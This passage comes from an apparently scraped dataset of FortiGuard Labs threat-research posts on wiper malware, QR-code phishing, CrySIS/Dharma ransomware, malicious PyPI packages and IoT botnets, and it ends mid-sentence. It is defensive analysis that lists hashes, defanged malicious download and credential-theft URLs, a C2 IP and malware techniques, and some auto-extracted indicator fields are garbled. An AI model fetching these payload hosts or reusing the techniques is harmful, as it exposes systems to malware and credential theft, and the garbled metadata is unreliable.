    "text": "FortiGuard Labs Threat Research FortiGuard Labs has been actively tracking wiper malware targeting Ukrainian organizations since the start of the 2022 Russia-Ukraine conflict. The sudden spike in wiper malware began early in the year with numerous new wiper samples targeted at Ukraine. It displayed a side of cyberattacks we rarely see: pure destruction. We published anarticlelast April 2022 to help people understand the context, history, and technical setup of wiper attacks. This post focuses on what happened the rest of the year and how wiper malware and their attack scenarios have changed. Affected Platforms:MultipleImpacted Users:Large organizationsImpact:Data loss and OS and file corruptionSeverity Level:High Since that last report, quite a few new samples have been launched. Figure 1 shows an updated version of a timeline we have used in the past. In April, we were already surprised by the significant increase in wipers. As you can see, it increased even further over the rest of the year. Much of the wiper malware seen in the first half of 2022, whether attributed or not, was deployed against Ukrainian organizations. These include HermeticWiper, CaddyWiper, IsaacWiper, WhisperGate, and others. When you think about it, the growth in wiper malware during a conflict is hardly a surprise. It can scarcely be monetized. The only viable use case is destruction, sabotage, and cyberwar. One interesting event was the AcidRain wiper malware that targeted the satellite modems of a global satellite communications provider, which caused modems to lose connections to their satellite network. The message was clear: even if a cyberattack is used to target Ukraine, its effects can easily spill over and affect other countries and organizations. It is vital that we track these new highly malicious attacks. As the year progressed, pro-Russian hacktivism also increased. We saw that in our telemetry, showing, for example, an increase in DDOS attacks in Nordic countries, especially Finland (Figure 2). However, hacktivism is usually associated with DoS and defacement attacks. But this time, some actors began repurposing their ransomware as wipers by not providing a decryption key. And if no decryption is provided, then ransomware essentially acts as a wiper. We saw actors begin to do this intentionally. For instance, the Somnia ransomware was deployed at several Ukrainian organizations. The attackers compromised systems using a fake software installer and established a persistent presence. Like most ransomware attacks, they exfiltrated data and kept their access as long as needed. But at the end of the attack, no decryptor was offered, meaning the files remained encrypted and useless. The most intriguing wiper we documented in the second half of 2022 was one named ‘Azov.’ Its second version quickly drew media attention because it delivered a message written in the name of well-known security researchers. These researchers denied any connection to the malware. It also delivered a pro-Ukrainian message claiming it was using the malware to draw more attention to the Ukraine-Russia war. However, so far, no attribution has been made. However, as it turned out, the message was not the most interesting part of the malware. It is also very compelling from a technical perspective. First, it was written in the assembly language and built with the FASM tool. This is unusual because most new malware is written in languages such as python, . NET or C/C++. It also contradicts everyone’s first impression that it was a prank used to blame security researchers. However, it seems unlikely that anybody would go to the effort to write malware in assembly just for a joke. It also implements polymorphic code creation to inject itself into legitimate EXE files on the infected machine. It then executes a backdooring function by injecting a modified version of itself into EXE files. This provides persistence to the malware because it can run again once the backdoored files are executed. It also implements a variety of anti-analysis techniques: All this demonstrates that this malware was not created for fun. It is a sophisticated wiper that implements a variety of modern techniques, clearly showing that a sophisticated threat actor. Ransomware authors understand that encryption speed is often crucial for a successful operation. Once encryption is started, they are in a race against the incident response team, who might detect them at any time. As a result, performance optimization was developed. Some new ransomware now implements a multi-threaded architecture that enables it to run multiple encryption threads in parallel. Other operators have realized that encrypting files in their entirety is time-consuming—and may not even be necessary. The BlackCat ransomware, for instance, implements multiple different encryption strategies with varying improvements in performance (see thisVirusBulletin presentation). A similar problem exists for wipers. Traditionally, wipers would erase an entire disk using a kernel driver, delete files using different techniques, and/or alter the content of files (more on techniques in ourlast article). These all take time. As a result, some authors began experimenting with performance optimization. The DoubleZero wiper, for instance, only erases the first 4096 bytes of targeted files. This means that most of the data in an average file would not be erased. However, it’s also true that restoring these files at scale would be very impractical. For instance, modern Microsoft .docx files are essentially a collection of compressed XML files. Deleting the first 4096 bytes from them would corrupt the compression and the generic file structure, meaning these files would not work anymore. Recreating a functioning file with manual forensic work might be possible, but it is simply not feasible when dealing with hundreds or thousands of files. The Azov wiper also implemented a somewhat more optimized wiping process. It does not remove all data in each file. Instead, it only targets 666 bytes in an alternating pattern (666 bytes overwritten, 666 bytes intact, 666 bytes overwritten, etc.) up to 4 GB. OT environments also saw their fair share of wipers. We already mentioned the attack against the satellite provider (and, by extension, the German windmills). Another interesting attack using the Industroyer. V2 malware targeted a Ukrainian high-voltage electric substation. That attack aimed to manipulate the electric relays to take the substation offline. In the context of OT, I would consider the use of the Industroyer. V2 malware in this context as a wiper. Traditional IT wipers have the goal of destroying the crown jewels of IT, the data. Industroyer. V2 was used to destroy the crown jewel of that substation, its operation. If this was not enough, the Industroyer. V2 malware was deployed along with three other wipers, potentially from different actors: This helps serve as a reminder that OT environments are being actively targeted by different threat actors, ranging from ransomware operators to state-sponsored APTs. An interesting new project to pay attention to is the Endurance wiper. It is an open-source wiper that seemingly aspires to become ransomware. Figure 3 shows the malware’s features and readiness state as described by the author. Currently, Endurance’s file-wiping capabilities offer three wiping modes, with each mode defining how many times content should be overwritten. It also offers CONTENT deletion and FILE deletion functions. The CONTENT deletion (Figure 4) function is responsible for overwriting the contents of a file on disk. The FILE deletion function (Figure 5) updates all file attributes and then erases the file from the disk. This tool is actively in development, although at the time of testing, we had to fix the code build it. Since it is open-source, this could provide an easy entry point for attackers wanting to join the wiper/ransomware game. 2022 provided us with new perspectives on destructive malware. We saw different wiping techniques, different motivations, and differentmotivations, actors, and deployment scenarios. New wiper instances, such as the Azov and Endurance wipers, show that actors are actively engaged in increasingly malicious activity. They are also trying to address shorter threat detection and response time by effectively optimizing the performance of their wiping strategies. And we are also seeing increased attention being paid to OT networks, such as the example of the Industroyer. V2 malware. The point is clear. The gloves are off as threat actors increasingly engage in attacks designed with one purpose: to destroy their targets. The Fortinet Antivirus engine protects against all binaries discussed in this report using the following signatures: W32/KillDisk. NCV!tr W32/Agent. OJC!worm W32/KillMBR. NHQ!tr W32/CaddyWiper. NCX!tr W32/KillFiles. NKU!tr.ransom W32/KillMBR. NGI!tr MSIL/Agent. FP!tr.dldr MSIL/Agent. QWILJV!tr W32/KillFiles. NKU!tr.ransom MSIL/VVH!tr MSIL/Agent. VVH!tr W32/DISTTRACK. C!tr W32/Generic. BQYIIWO!tr W64/DistTrack. A!tr W32/Ordinypt.5873!tr.ransom W32/OlympicDestroyer. A!tr W32/Petya. EOB!tr W32/Petya. A!tr.ransom W64/Petya. BG!tr W32/Agent. F0FC!tr W64/Dustman. KH!tr W32/Distrack!tr W32/Agent. XACVYS!tr W32/Distrack!tr MSIL/DZeroWiper. CK!tr ELF/AcidRain. A!tr MSIL/KillMBR. X!tr MSIL/KillDisk. I!tr W32/PossibleThreat The FortiGuard Web Filtering service rates the C2 server as ‘Malicious’ and blocks it accordingly. FortiMail and FortiSandbox detect and quarantine the malicious attachments in this campaign, and Fortinet’s CDR (Content Disarm and Reconstruction) service can disable them. FortiEDR natively detects and blocks the malicious executables identified in the report based on their behavior. In addition to these protections, Fortinet can help train users to detect and understand phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE trainingprogram—NSE 1 – Information Security Awareness—includes a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks. 650f0d694c0928d88aeeed649cf629fc8a7bec604563bca716b1688227e0cc7e - Azov 100c5e4d5b7e468f1f16b22c05b2ff1cfaa02eafa07447c7d83e2983e42647f0 - Somnia_07_08_22_with_FunnySomnia.rar ac5e68c15f5094cc6efb8d25e1b2eb13d1b38b104f31e1c76ce472537d715e08 - Somnia_07_08_22_with_FunnySomnia.exe (Somnia) 99cf5c03dac82c1f4de25309a8a99dcabf964660301308a606cdb40c79d15317 - 1.exe (Cobalt Strike Beacon) 156965227cbeeb0e387cb83adb93ccb3225f598136a43f7f60974591c12fafcf - funnysomnia.exe e449c28e658bafb7e32c89b07ddee36cadeddfc77f17dd1be801b134a6857aa9 - text.exe (Somnia*) fbed7e92caefbd74437d0970921bfd7cb724c98c90efd9b6d0c2ac377751c9e5 - Ip_scanner.zip 06fe57cadb837a4e3b47589e95bb01aec1cfb7ce62fdba1f4323bb471591e1d2 - Ip_scanner.exe (Themida; Vidar) 1e0facd62d1958ccf79e049270061a9fce3223f7986c526f6f3a93ef85180a72 - Ip_scanner_unpacked.exe (Vidar) 3b2e708eaa4744c76a633391cf2c983f4a098b46436525619e5ea44e105355fe – DoubleZero 931b6b29e13d76a0e2e1e8b6910873d5ff7b88fd8c51cadf46057e47b695f187 – Endurance BDF8B53D73CA1ED1B649B32A61608B2CF952397EF3D5FC2E6E9F41AD98C40110 – Cry Wiper 91a9180a9cf7674c34ed53a8aa4e36b798334d1f448aeaf1afb9add4fd322b6e – Fantasy 0ad0cd07ca69d8fd2b075fef6e6dd5e9f7debca92af3a6b84d83e51e23bc182d – Bruh Wiper Learn more about Fortinet’sFortiGuard Labsthreat research and global intelligence organization and Fortinet’s FortiGuard AI-powered Security Servicesportfolio. Sign upto receive our threat research blogs. threat research,FortiGuards Labs,ukraine,wiper malware FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/the-year-of-the-wiper",
      "scraped_at": "2025-07-20T14:01:14.624214",
      "indicators": {
        "ip_address": [],
        "domain": [
          "",
          "r",
          "unnysomnia",
          "ext"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "e449c28e658bafb7e32c89b07ddee36cadeddfc77f17dd1be801b134a6857aa9",
          "1e0facd62d1958ccf79e049270061a9fce3223f7986c526f6f3a93ef85180a72",
          "fbed7e92caefbd74437d0970921bfd7cb724c98c90efd9b6d0c2ac377751c9e5",
          "931b6b29e13d76a0e2e1e8b6910873d5ff7b88fd8c51cadf46057e47b695f187",
          "3b2e708eaa4744c76a633391cf2c983f4a098b46436525619e5ea44e105355fe",
          "ac5e68c15f5094cc6efb8d25e1b2eb13d1b38b104f31e1c76ce472537d715e08",
          "0ad0cd07ca69d8fd2b075fef6e6dd5e9f7debca92af3a6b84d83e51e23bc182d",
          "650f0d694c0928d88aeeed649cf629fc8a7bec604563bca716b1688227e0cc7e",
          "156965227cbeeb0e387cb83adb93ccb3225f598136a43f7f60974591c12fafcf",
          "100c5e4d5b7e468f1f16b22c05b2ff1cfaa02eafa07447c7d83e2983e42647f0",
          "06fe57cadb837a4e3b47589e95bb01aec1cfb7ce62fdba1f4323bb471591e1d2",
          "BDF8B53D73CA1ED1B649B32A61608B2CF952397EF3D5FC2E6E9F41AD98C40110",
          "91a9180a9cf7674c34ed53a8aa4e36b798334d1f448aeaf1afb9add4fd322b6e",
          "99cf5c03dac82c1f4de25309a8a99dcabf964660301308a606cdb40c79d15317"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.5764563106796117
    }
  },
  {
    "id": "Fortinet_45851",
    "source": "Fortinet",
    "title": "QR Code Phishing Attempts to Steal Credentials from Chinese Language Users",
    "text": "FortiGuard Labs Threat Research Every day, millions of internet and application users enter the ubiquitous username and password in the myriad of places where they shop, work, pay bills, socialize, and stream entertainment. This practice carries significant risk. If one of those locations is compromised, that username and password information usually finds its way to dark web markets where it is offered for sale. And those credentials can be very valuable (and costly to the owner!) if they can be reused in places like a financial institution or online shopping site that have monetary value for the criminal. Affected Platforms:Mobile and DesktopImpacted Users:Mobile and DesktopImpact:Potential to steal credentialsSeverity Level:Medium Cybercriminals use a variety of techniques designed to steal credentials. FortiGuard Labs recently discovered an interesting phishing campaign using a variety of QR codes to target Chinese language users. It aims to steal credentials by luring users into entering their data into a phishing website owned by the threat actor. The e-mail is reasonably simple and streamlined and contains a Microsoft Word attachment. The e-mail attempts to spoof the Chinese Ministry of Finance. Translated to English, the e-mail subject in Figure 1 reads: “Re: Notice on the application for personal labor subsidies in 2022”. The body states, “Please click on the attachment to view the notification of the Ministry of Finance's application for personal labor subsidies in the fourth quarter of 2022!”. The Microsoft Word attachment, “转发：关于财四季度个人劳动补贴申领通知.docx” translates to: “Forward: Notice on Application for Personal Labor Subsidy in the Fourth Quarter of Fiscal Year.docx.” 转发：关于财四季度个人劳动补贴申领通知.docx Once the attachment is opened, the user is presented with some text and a large QR code in the center of the document. A QR code requires an application to read and translate it into something actionable. Most mobile phones have this functionality through their camera, and software packages are available on all major platforms to do this from a computer. In each of the examples FortiGuard Labs found, the QR code contained in the Microsoft Word attachments provided a URL for the user to follow. When the user does this using their desktop platform or mobile device, they arrive at a website controlled by the threat actor. FortiGuard Labs reviewed the linked website. It is a spoofed facsimile of a DingTalk instance (it should be noted that as of the publication date, this site is now offline). DingTalkis a broadly used enterprise communication platform developed by Alibaba Group. Given the reach of the platform and its large number of users, credentials for it would be valuable. The user is directed to a pop-up message box that suggests their DingTalk account has committed some unspecified business violation(s) and that it will be frozen without verification in 24 hours. After acknowledging the message box, the user is invited to enter their credentials to address the issue. Credentials provide a valuable resource for criminals and threat actors by providing a direct route into a victim’s applications or environment. These may be used directly or sold to another group for use in their operations. This example shows that attackers are putting significant effort into ensuring their landing pages look as realistic as possible and that their lures can convince victims to let down their guard. Whatever the attacker's motives, these attacks will undoubtedly be prevalent for some time. Users are cautioned to verify emails, not open attachments or links, and never enter credentials into a site they have not seen before. Rather than using a received link, users are encouraged to go to the known main site of the vendor to conduct any business. Users can also hover over a link to look for an unusual URL. Organizations are also encouraged to provide training to users to help them identify and avoid malicious email attachments and links. Fortinet customers are already protected from this malware through FortiGuard’s Web Filtering, AntiVirus, FortiMail, FortiClient, and FortiEDR services, as follows: The following (AV) signature detects the malware samples mentioned in this blog MSWord/Phish. CCFD!tr Data/Phish.9C34!phish The WebFiltering client blocks all network-based URIs. Fortinet has multiple solutions designed to help train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. In addition to these protections, we suggest that organizations have their end users undergo our FREENSE training:NSE 1 – Information Security Awareness. It includes a module on Internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks. File-based IOCs: 重要通知.docx (Important Notice.docx) 939656a000b7ca2f54bc42d635537261ce5194e2041f1c3ac37e3c72f8ec5333 转发：关于财四季度个人劳动补贴申领通知.docx (Forward: Notice on Application for Personal Labor Subsidy in the Fourth Quarter of Fiscal Year.docx) f941b76a33b5a1d425569a0ed689023597fd7fc3acb301ec11a37feb71dcb597 财务重要通知.docx (Financial Important Notice.docx) ac5f4ba15e883813b3018614887b8f65b2f90d252ab7cdffe6f05f8482e1672a Network-based IOCs: hXXp://w.mryrej.cn Credential theft site hXXps://l99etsen5677cryptorgacme.h7g33.cn Credential theft site hXXp://www.sgiabuq189qhijl.cn Credential theft site Learn more about Fortinet’sFortiGuard Labsthreat research and global intelligence organization and Fortinet’s FortiGuard AI-powered SecurityServices portfolio. Sign upto receive our threat research blogs. threat research,email phishing,phishing,FortiGuards Labs,qr FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/qr-code-phishing-attempts-to-steal-credentials-from-chinese-language-users",
      "scraped_at": "2025-07-20T14:01:22.654740",
      "indicators": {
        "ip_address": [],
        "domain": [
          "",
          "otice",
          "7g33",
          "ear",
          "giabuq189qhijl"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "ac5f4ba15e883813b3018614887b8f65b2f90d252ab7cdffe6f05f8482e1672a",
          "f941b76a33b5a1d425569a0ed689023597fd7fc3acb301ec11a37feb71dcb597",
          "939656a000b7ca2f54bc42d635537261ce5194e2041f1c3ac37e3c72f8ec5333"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.42303172737955347
    }
  },
  {
    "id": "Fortinet_58600",
    "source": "Fortinet",
    "title": "Ransomware Roundup – Playing Whack-a-Mole with New CrySIS/Dharma Variants",
    "text": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report provides readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This latest edition of the Ransomware Roundup covers variants of the CrySIS/Dharma ransomware family. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts files on the compromised machine and demands ransom for file decryptionSeverity level:High The CrySIS/Dharma ransomware family has been around for several years – dating to at least 2016. It nominally operates using a Ransomware-as-a-Service (RaaS) model. However, it should also be noted that at least one version of the ransomware had its source code leaked, allowing anyone to purchase and repurpose it for their own ends. Due to this proliferation of versions, it’s become a game of “whack-a-mole” when new ones pop up with different operators. Several methods have been used by CrySIS/Dharma operators to gain access to an environment—most famously, exposed Microsoft Remote Desktop Protocol (RDP) servers. It has also been delivered via phishing with attachments disguised as installation files for legitimate software, including AV vendors. When launched, the ransomware sets the console to codepage 1251, which covers the ability to use Cyrillic languages such as Russian, Ukrainian, and Bulgarian. It also deletes shadow copies of the system to hamper any attempts at recovery. An additional copy of the ransomware is copied to the host’s “~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup” folder to ensure it runs in the event the system is restarted before encryption has occurred. All files of interest, such as personal and operational documents (it does not touch system files), are then subjected to encryption. Encrypted files have an extension generally referring to the threat actor controlling the ransomware. These tend to vary widely, as seen in the following images. In an unusual step, once encryption is complete, the malware launches the Microsoft HTML Application (MSHTA) to process and display a file called “Info.hta”. Copies of this file are stored in four separate locations on the host: “Info.hta” is essentially an HTML file containing the ransom's details. While there are variations in the ransom notes, all contain a method to contact the attacker to discuss the details of the ransom. A unique ID, which appears to be based on the characteristics of the victim system, is also displayed. In addition to its “Info.hta” file, a separate file called “info.txt” is also dropped. It contains a truncated set of instructions to contact the attacker. A copy is dropped at the following locations: Fortinet customers are already protected from this malware variant through FortiGuard’s Web Filtering, AntiVirus, and FortiEDR services, as follows: FortiGuard Labs detects known CrySIS/Dharma ransomware variants with the following AV signatures: File-based IOCs: 419bc8196013d7d8c72b060da1a02d202d7e3eb441101f7bcb6d7667871a5c16 5c2fb1c42f007093be5e463f70ee7e7192990b3385a3cbcc71043980efa312e0 6a0017262def9565b504d04318c59f55bea136ac3dd48862d1ae90ff6b963811 b557bf11d82d3d64d028a87584657d25dba0480295ed08447f10c7a579dee048 b3984a2de76eee3ad20c4b13e0c0cbbab2dd6db65e3f6ca34418e79c21cf5c39 e9253218e30b30c8bb690b2ab02eef47b8b5c8991629d814b2af6664151e9a2f Due to the ease of disruption, damage to daily operations, potential impact to an organization’s reputation, and the unwanted destruction or release ofpersonally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because payment does not guarantee that files will be recovered. According to aU. S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. And ourIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard AI-powered securityservices portfolio. threat research,Ransomware Roundup,ransomware,wiper malware,CrySIS Dharma FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-playing-whack-a-mole-with-new-crysis-dharma-variants",
      "scraped_at": "2025-07-20T14:01:30.540270",
      "indicators": {
        "ip_address": [],
        "domain": [
          "nfo"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "6a0017262def9565b504d04318c59f55bea136ac3dd48862d1ae90ff6b963811",
          "e9253218e30b30c8bb690b2ab02eef47b8b5c8991629d814b2af6664151e9a2f",
          "5c2fb1c42f007093be5e463f70ee7e7192990b3385a3cbcc71043980efa312e0",
          "419bc8196013d7d8c72b060da1a02d202d7e3eb441101f7bcb6d7667871a5c16",
          "b3984a2de76eee3ad20c4b13e0c0cbbab2dd6db65e3f6ca34418e79c21cf5c39",
          "b557bf11d82d3d64d028a87584657d25dba0480295ed08447f10c7a579dee048"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.5863539445628997
    }
  },
  {
    "id": "Fortinet_36989",
    "source": "Fortinet",
    "title": "Supply Chain Attack Using Identical PyPI Packages, “colorslib”, “httpslib”, and “libhttps”",
    "text": "FortiGuard Labs Threat Research TheFortiGuard Labsteam has discovered a new 0-day attack embedded in three PyPI packages (Python Package Index) called ‘colorslib’, ‘httpslib’, and “libhttps”. They were found on January 10, 2023, by monitoring an open-source ecosystem. The Python packages “colorslib” and “httpslib” were published on January 7, 2023, and “libhttps” was published on January 12, 2023. All three were published by the same author, ‘Lolip0p’, as shown in the official PyPI repository. ‘Lolip0p’ joined the repository close to the publish date. The author puts the project description that may look legitimate and clean as shown below. All versions of these packages are malicious. Interestingly, when we look at the setup.py script for these packages, we find they are identical. They try to run a PowerShell with a suspicious URL that needs further analysis: https://dl[.]dropbox[.]com/s/mkd3enun97s8zag/Oxzy[.]exe?dl=0 As shown in the VirusTotal entry below, the download URL includes the following binary exe (SHA 256): 8dc8a9f5b5181911b0f4a051444c22e12d319878ea2a9eaaecab9686e876690b While this download URL has not previously been detected by any other threat researchers, some vendors do flag the downloaded executable file as malicious. The downloaded executable is called ‘Oxyz.exe’. It drops another executable, ‘update.exe’, that runs in the folder ‘%USER%\\AppData\\Local\\Temp\\’ As shown in the VirusTotal entry below, several vendors flag this binary exe as malicious (SHA 256): 293a3a2c8992636a5dba58ce088feb276ba39cf1b496b336eb7b6f65b1ddb757 When running ‘update.exe’, it drops a series of files to the folder ‘%USER%\\AppData\\Local\\Temp\\onefile_%PID_%TIME%’. The dropped file, ‘SearchProtocolHost.exe’, is flagged as malicious by several vendors (SHA 256): 123fd1c46a166c54ad66e66a10d53623af64c4b52b1827dfd8a96fdbf7675638 In this blog, we showed a single author posting separate Python packages that use the same code to launch an attack. The author also positions each package as legitimate and clean by including a convincing project description. However, these packages download and run a malicious binary executable. Python end users should always perform due diligence before downloading and running any packages, especially from new authors. And as can be seen, publishing more than one package in a short time period is no indication that an author is reliable. FortiGuard AntiVirus detects the malicious executables identified in this report as Oxzy.exe:Malicious_Behavior. SB update.exe:PossibleThreat. PALLASNET. H SearchProtocolHost.exe:Malicious_Behavior. SB TheFortiGuard AntiVirusservice is supported byFortiGate,FortiMail,FortiClient, andFortiEDR. Customers running current AntiVirus updates are protected. The FortiGuard Web Filtering Service detects the download URLs cited in this report as Malicious and blocks them. 8dc8a9f5b5181911b0f4a051444c22e12d319878ea2a9eaaecab9686e876690b 293a3a2c8992636a5dba58ce088feb276ba39cf1b496b336eb7b6f65b1ddb757 SearchProtocolHost.exe 123fd1c46a166c54ad66e66a10d53623af64c4b52b1827dfd8a96fdbf7675638 Malicious URLs https://dl[.]dropbox[.]com/s/mkd3enun97s8zag/Oxzy[.]exe?dl=0 Learn more about Fortinet’sFortiGuard Labsthreat research and global intelligence organization and Fortinet’s FortiGuard AI-powered SecurityServices portfolio. Sign upto receive our threat research blogs. threat research,security attack,python FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/supply-chain-attack-using-identical-pypi-packages-colorslib-httpslib-libhttps",
      "scraped_at": "2025-07-20T14:01:38.839337",
      "indicators": {
        "ip_address": [],
        "domain": [
          "earchProtocolHost",
          "xyz",
          "pdate",
          "xzy",
          "etup"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "293a3a2c8992636a5dba58ce088feb276ba39cf1b496b336eb7b6f65b1ddb757",
          "8dc8a9f5b5181911b0f4a051444c22e12d319878ea2a9eaaecab9686e876690b",
          "123fd1c46a166c54ad66e66a10d53623af64c4b52b1827dfd8a96fdbf7675638"
        ],
        "cve": [],
        "email": [],
        "url": [
          "https://dl"
        ]
      },
      "threat_score": 0.48951048951048953
    }
  },
  {
    "id": "Fortinet_98665",
    "source": "Fortinet",
    "title": "2022 IoT Threat Review",
    "text": "FortiGuard Labs Threat Research FortiGuard Labsmonitors the IoT botnet threat landscape for new and emerging campaigns. We do this with the assistance of our honeypots we have deployed to capture active attacks in the wild. This article provides insights into the data collected from our monitoring system over the past year. Affected Platforms:Linux Impacted Users:Any organization Impact:Remote attackers gain control of the vulnerable systems Severity Level:Critical Our distributed honeypot systems allow us to capture and monitor campaigns that are actively targeting IoT devices for infection. In most cases, these devices are turned into bots used to perform Distributed Denial of Service (DDoS) attacks. These malware campaigns primarily brute force Telnet and SSH credentials to gain access to IoT devices and then execute their bot binaries. In 2022, a total of over 20 million successful brute force attacks were recorded by our system. Figure 1 shows the number of successful brute force attacks against our honeypots by month. Based on 121,799 unique attacker IPs observed in 2022, see a breakdown of where IPs were hosted by country (Figure 2). In terms of attack volume, see a breakdown of where the majority originate from based on where servers are hosted (Figure 3). Aside from brute forcing credentials to infect devices, IoT malware also takes advantage of vulnerabilities to spread, such as in theBeastmode Miraicampaign we discussed in April. Our monitoring system identifiespossible exploitation requests being used by malware samples. From over a hundred vulnerabilities targeted by IoT malware samples that were captured last year, we primarily observed attempts to exploit CVE-2017-17215, an old Remote Code Execution (RCE) vulnerability targeting Huawei HG532 routers. In fact, over 30% of the malware samples containing embedded exploits target this vulnerability (Figure 4). In terms of the actual volume of attacks in the wild, based on 30-day Fortinet IPS telemetry, we can see that the IPS signatureHuawei. HG532. Remote. Code. Executiondetected efforts to exploit CVE-2017-17215. We captured an average of 80,000 daily detections, peaking at 160,000. We also found the following CVEs from 2022 being targeted: It is important to note that although there were attempts to target Local File Inclusion (LFI) vulnerabilities, they were not properly implemented to successfully exploit them. The most actively exploited vulnerability from the list above is the CVE-2022-22954. It targeted VMware Workspace ONE Access. TheVMware. Workspace. ONE. Access. Catalog. Remote. Code. ExecutionIPS signature recorded an average of 80,000 daily detections based on a 30-day Fortinet IPS telemetry. Ourpostfrom October noted that this vulnerability is also a hot target for other non-IoT malware campaigns. We also observed that the F5 BIG-IP iControl CVE-2022-1388 (F5. BIG-IP.iControl. REST. Authentication. Bypass) was another popular vulnerability, experiencing a daily average of 25,000 hits, peaking at 50,000. Based on our research, the majority of IoT malware is built to run on an ARM 32-bit architecture— comprising almost three-quarters of all samples captured (Figure 8). The “script file” label is for plaintext Bash scripts with the purpose of downloading and installing the payload binary after brute forcing or exploitation. Figure 9 shows the most common malware families detected by our systems, grouped by month. Mirai and Gafgyt variants are predominant, with Kyton, a Gafgyt/Mirai hybrid, being one of the most heavily distributed families in terms of volume. Being a Gafgyt/Mirai hybrid, Kyton reuses code from other Mirai variants to exploit CVE-2017-17215 (Huawei Router HG532), JAWS Webserver RCE, or CVE-2014-8361 (RealtekSDK). Samples tagged as_unknownon the graph (Figure 9) are malware yet to be linked to any known malware campaigns. They could be fresh botnets infecting our honeypots. As shown in the Figure 9 statistics, while most of the active IoT botnets last year were based on Mirai and Gafgyt, there were several campaigns that stood out from the crowd. In mid-March, for example, we encounteredEnemybot, which at the time was the latest botnet campaign from the threat group Keksec. It was a hybrid of Gafgyt and Mirai and was using the TOR network to mask its real Command and Control (C2) servers. RapperBotis a DDoS botnet that we encountered in mid-June. This malware is interesting because it was using an embedded SSH client to spread and because we observed unusual changes to its variants that made us question its primary motivation. In October 2022, we observed a newcampaignfrom potentially the same threat actors targeting servers for popular games. Lastly,Zerobotis a DDoS botnet written in the Go programming language (also known as Golang) that FortiGuard Labs first encountered in November 2022. It utilizes both old and recent vulnerabilities to spread, and uses WebSockets to communicate with its C2 servers. Another trend that we saw with IoT botnets was the rise of samples written in Golang despite its compiled binaries having relatively much larger file sizes. A Golang ELF binary executable can easily be above 4MB in size, whereas normal Mirai and Gafgyt binaries fall below 300KB. For this reason, some campaigns use the UPX packer to help reduce the file size. Up through October 2022, one of the C2 servers (176[.]65[.]137[.]5) listed in our Zerobot report historically distributed the Mirai-based SORA variant. It then switched to distributing Zerobot the month after. For example, hxxp://176[.]65[.]137[.]5/bins/zero[.]x86 served a UPX-packed SORA binary in October 2022 (Figure 10), but similar URLs with thezero.{arch}filename were later seen distributing Zerobot instead. The switch from distributing SORA to Zerobot, but using the same campaign filename is interesting as these families do not share a common C2 protocol. The intent behind the switch remains unclear. Apart from Zerobot, we are also highlighting several additional Golang botnets caught by our honeypots. In early November 2022, we collected samples of a DDoS botnet that supports only TCP-based DDoS 